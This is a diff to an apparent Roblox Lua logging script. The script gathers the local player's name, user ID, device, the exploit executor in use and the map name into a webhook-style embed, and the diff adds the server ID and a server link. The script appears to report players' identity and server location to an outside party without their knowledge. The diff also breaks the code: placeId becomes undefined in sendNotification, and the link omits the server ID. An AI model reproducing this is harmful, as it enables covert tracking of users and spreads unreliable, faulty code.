@@ -61,14 +61,21 @@ local function detectExploit()
     return "None"
 end
 
+-- Function to get server information
+local function getServerInfo()
+    local placeId = game.PlaceId
+    local serverId = game.JobId
+    local serverLink = "https://www.roblox.com/games/" .. tostring(placeId) .. "/--"
+    return serverId, serverLink
+end
+
 local function sendNotification()
     local playerName = game.Players.LocalPlayer.Name
     local playerDisplayName = game.Players.LocalPlayer.DisplayName
     local playerUserId = game.Players.LocalPlayer.UserId
-    local placeId = game.PlaceId
-    local placeName = "Unknown"
 
     -- Get the place name from the place ID
+    local placeName = "Unknown"
     local success, placeInfo = pcall(function()
         return MarketplaceService:GetProductInfo(placeId)
     end)
@@ -82,6 +89,9 @@ local function sendNotification()
 
     local device = detectDevice(userAgent)
     local exploit = detectExploit()
+
+    -- Get server information
+    local serverId, serverLink = getServerInfo()
 
     local data = {
         ["embeds"] = {
@@ -112,6 +122,16 @@ local function sendNotification()
                     {
                         ["name"] = "Map Name:",
                         ["value"] = placeName,
+                        ["inline"] = true,
+                    },
+                    {
+                        ["name"] = "Server ID:",
+                        ["value"] = serverId,
+                        ["inline"] = true,
+                    },
+                    {
+                        ["name"] = "Server Link:",
+                        ["value"] = "[" .. placeName .. "](" .. serverLink .. ")",
                         ["inline"] = true,
                     },
                     {
